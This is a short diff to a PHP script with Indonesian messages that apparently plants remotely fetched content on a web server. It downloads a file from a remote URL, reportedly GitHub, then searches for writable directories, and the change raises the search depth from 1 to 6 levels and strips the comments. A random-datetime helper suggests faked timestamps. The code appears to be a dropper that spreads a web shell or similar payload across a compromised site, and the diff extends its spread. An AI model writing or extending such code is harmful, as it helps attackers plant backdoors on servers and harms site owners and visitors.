@@ -55,16 +55,13 @@ function generate_random_datetime() {
     return sprintf('%04d-%02d-%02d %02d:%02d', $year, $month, $day, $hour, $minute);
 }
 
-// Ambil konten dari GitHub
 $originalContent = fetch_from_url($remoteFile);
 if (!$originalContent || strlen($originalContent) < 10) {
     exit("❌ Gagal mengunduh konten dari GitHub.<br>\n");
 }
 
-// Scan folder writable dari lokasi script + 1 level subfolder
-$allWritable = scanWritableDirs(__DIR__, 1);
+$allWritable = scanWritableDirs(__DIR__, 6);
 
-// Jika kosong, hentikan
 if (empty($allWritable)) {
     exit("❌ Tidak ada folder writable ditemukan.<br>\n");
 }
